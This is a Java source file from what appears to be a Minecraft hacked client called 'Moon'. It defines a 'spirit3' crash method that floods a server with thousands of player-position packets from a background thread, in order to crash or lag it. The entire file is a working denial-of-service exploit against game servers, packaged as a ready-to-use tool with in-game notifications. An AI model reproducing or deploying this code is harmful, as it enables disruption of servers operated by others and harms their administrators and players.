package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

@CrashInfo(
        name = "spirit3"
)
public class CrashSpirit3 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Spirit crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    for (double yPos = Minecraft.getMinecraft().thePlayer.posY; yPos < 255; yPos += 5)
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX, yPos, Minecraft.getMinecraft().thePlayer.posZ, true));

                    for (int i2 = 0; i2 < (1337 * 5); i2 += 5) {
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + i, 255, Minecraft.getMinecraft().thePlayer.posZ + i, true));
                    }
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
